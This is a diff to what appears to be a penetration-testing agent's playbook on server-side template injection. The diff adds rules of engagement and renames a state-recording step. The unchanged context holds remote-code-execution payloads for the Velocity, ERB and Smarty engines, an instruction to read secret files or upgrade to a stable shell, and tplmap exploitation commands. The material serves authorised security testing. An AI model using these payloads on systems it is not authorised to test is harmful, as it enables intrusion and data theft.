@@ -4,6 +4,9 @@ description: "SSTI detection, engine fingerprinting, RCE. Triggers - {{7*7}} ret
 tags: [vuln_assess, exploitation]
 ---
 
+## Rules of Engagement
+Only test systems you are authorized to assess. Confirm the written scope and rate limits before active commands. Prefer the least-invasive check that proves impact; stop on evidence of production impact.
+
 # Server-Side Template Injection (SSTI)
 
 ## When this fires
@@ -33,7 +36,7 @@ Velocity: #set($e="e");$e.getClass().forName("java.lang.Runtime").getMethod("exe
 ERB:      <%= `id` %>  /  <%= system('id') %>
 Smarty:   {system('id')}  /  {php}system('id');{/php}
 ```
-**Proof required:** `id`/`uname -a` output (RCE), or read a secret file. Then convert to a stable shell / `record_artifact`.
+**Proof required:** `id`/`uname -a` output (RCE), or read a secret file. Then convert to a stable shell; record it via `state_update`.
 
 ## Tooling
 `tplmap -u '<url>?p=*'` (auto-detect+exploit) if available; else manual per above. `nuclei -tags ssti`.
